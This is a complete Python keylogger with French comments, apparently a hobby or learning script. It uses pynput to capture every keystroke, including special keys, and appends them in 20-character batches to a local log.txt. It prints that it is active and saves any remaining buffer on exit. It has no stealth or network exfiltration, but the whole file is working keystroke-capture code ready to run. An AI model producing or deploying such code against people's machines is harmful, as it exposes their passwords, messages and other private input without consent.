from pynput import keyboard

log_file = "log.txt"
buffer = ""
BUFFER_SIZE = 20 # Nombre de caractères à stocker avant d'écrire dans le fichier

def write_to_file(data): # Ecrire dans le fichier
    if data:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(data)

def on_press(key):
    global buffer
    
    # Je nettoie l'output pour les touches spéciales et les espaces (sinon ça affichera des lettres avec des guillements)
    k = str(key).replace("'", "")
    if k == "Key.space": k = " "
    elif k == "Key.enter": k = "\n"
    elif "Key" in k: 
        clean_key = k.replace("Key.", "")
        k = f"[{clean_key}]"

    # Gestion du buffer
    buffer += k
    
    if len(buffer) >= BUFFER_SIZE: # Si le buffer atteint la taille définie, on l'écrit dans le fichier
        write_to_file(buffer) # Appel de write to file pour écrire le contenu du buffer dans le fichier
        buffer = "" # On vide le buffer après l'écriture

print("Keylogger actif ! (CTRL+C pour arrêter)")

# Le listener est mis dans un bloc try-except pour gérer proprement l'arrêt du script et s'assurer que les données du buffer sont sauvegardées même en cas d'arrêt brutal
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        
except KeyboardInterrupt:
    # Cette partie gère l'arrêt par CTRL+C proprement
    print("\nArrêt du script détecté...")

finally:
    # Ce bloc s'exécute toujours, même en cas de crash ou d'arrêt
    if buffer:
        print(f"Sauvegarde d'urgence des {len(buffer)} derniers caractères !")
        write_to_file(buffer)